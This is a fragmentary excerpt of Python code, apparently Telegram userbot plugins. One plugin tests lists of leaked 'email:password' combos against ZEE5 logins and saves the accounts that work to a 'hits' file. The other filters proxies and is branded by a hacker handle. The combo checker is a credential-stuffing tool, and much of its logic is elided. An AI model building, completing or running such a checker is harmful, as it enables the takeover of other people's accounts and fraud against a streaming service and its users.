...
async def zee5(event):
    ...
    if len(stark_dict) > 50:
        await event.edit('`Thats A Lot Of Combos. Keep 50 As Limit`')
        return
    for i in stark_dict:
        starkm = i.split(":")
        email = starkm[0]
        ...
        if meke.get("token"):
            ...
            bads += 1
    if len(hits_dict) == 0:
        await event.edit("**0 Hits. Probably, You Should Find Better Combos.**")
        return
    with open("hits.txt", "w") as hitfile:
        for s in hits_dict:
            hitfile.write(s + ' | @Hackintush')
...
async def _(event):
    if event.fwd_from:
        return
    await event.edit("Checking Proxies. Please Wait...")
    ...
    if Counter<=0:
      ...
      file1 = open("goods.txt", "a")
      file1.write("\nChecked By  CɪᴘʜᴇʀX") 
      file1.close() 
      await borg.send_file(event.chat_id, "goods.txt", caption=f"**Proxies Checked**\n**Good Proxies: ** {Counter}\n\n**Checked By  CɪᴘʜᴇʀX**")
      os.remove(escobar)
      os.remove("goods.txt")
